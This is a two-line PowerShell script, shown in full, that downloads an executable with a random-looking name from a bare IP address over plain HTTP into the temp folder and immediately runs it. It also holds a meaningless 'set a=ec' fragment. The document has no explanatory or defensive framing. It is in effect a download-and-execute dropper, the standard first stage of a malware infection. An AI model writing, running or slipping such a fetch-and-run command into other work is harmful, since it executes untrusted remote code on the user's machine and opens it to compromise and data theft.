#!/usr/bin/env pwsh
Invoke-WebRequest -Uri 'http://20.7.43.70/BkRCY.exe' -OutFile $env:temp\file.exe; set a=ec; start $env:temp\file.exe